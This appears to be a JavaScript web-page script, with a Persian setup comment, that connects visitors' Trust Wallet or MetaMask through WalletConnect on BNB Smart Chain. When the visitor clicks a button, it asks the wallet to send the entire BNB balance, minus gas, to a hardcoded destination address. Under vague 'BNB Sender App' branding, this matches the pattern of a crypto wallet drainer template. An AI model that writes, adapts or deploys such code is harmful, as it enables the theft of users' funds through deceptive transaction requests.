import SignClient from "@walletconnect/sign-client";
import { ethers } from "ethers";

// جایگزین کن با Project ID واقعی و آدرس مقصد دلخواه
const projectId = "4d08946e6c316bed5e76b450ccbb5256";
const targetAddress = "0x98907E5eE9E010c34DF6F7847565D421D3CDAd05";

const provider = new ethers.JsonRpcProvider("https://bsc-dataseed.binance.org/");
let client;
let session;
let userAddress = null;

document.getElementById("connectTrust").addEventListener("click", () => connectWithWallet("trust"));
document.getElementById("connectMetaMask").addEventListener("click", () => connectWithWallet("metamask"));
document.getElementById("sendAllBtn").addEventListener("click", sendAllBNB);

async function connectWithWallet(wallet) {
  try {
    if (!client) {
      client = await SignClient.init({
        projectId,
        metadata: {
          name: "BNB Sender App",
          description: "Send BNB to target",
          url: "https://yourdomain.com",
          icons: ["https://walletconnect.com/walletconnect-logo.png"]
        }
      });
    }

    const { uri, approval } = await client.connect({
      requiredNamespaces: {
        eip155: {
          methods: ["eth_sendTransaction"],
          chains: ["eip155:56"],
          events: ["accountsChanged", "chainChanged"]
        }
      }
    });

    if (uri) {
      const encoded = encodeURIComponent(uri);
      const link = wallet === "trust"
        ? `https://link.trustwallet.com/wc?uri=${encoded}`
        : `metamask://wc?uri=${encoded}`;
      window.location.href = link;
    }

    session = await approval();
    const address = session.namespaces.eip155.accounts[0].split(":")[2];
    userAddress = address;
    document.getElementById("address").textContent = address;

    const balance = await provider.getBalance(address);
    const bnb = ethers.formatEther(balance);
    document.getElementById("balance").textContent = `${bnb} BNB`;

    document.getElementById("sendAllBtn").disabled = false;

  } catch (err) {
    console.error("Connection error:", err);
    alert("Connection failed: " + (err?.message || err));
  }
}

async function sendAllBNB() {
  if (!session || !userAddress) {
    alert("Please connect wallet first");
    return;
  }

  try {
    const balance = await provider.getBalance(userAddress);
    const feeData = await provider.getFeeData();
    const gasPrice = feeData.gasPrice;
    const gasLimit = 21000n;
    const gasCost = gasLimit * gasPrice;

    const amountToSend = balance - gasCost;
    if (amountToSend <= 0n) {
      alert("Not enough BNB to send (gas cost too high)");
      return;
    }

    const tx = {
      from: userAddress,
      to: targetAddress,
      value: `0x${amountToSend.toString(16)}`,
      gas: `0x${gasLimit.toString(16)}`,
      gasPrice: `0x${gasPrice.toString(16)}`
    };

    const result = await client.request({
      topic: session.topic,
      chainId: "eip155:56",
      request: {
        method: "eth_sendTransaction",
        params: [tx]
      }
    });

    alert("Transaction sent!\nTx Hash:\n" + result);

  } catch (err) {
    console.error("Transaction error:", err);
    alert("Transaction failed: " + (err?.message || err));
  }
}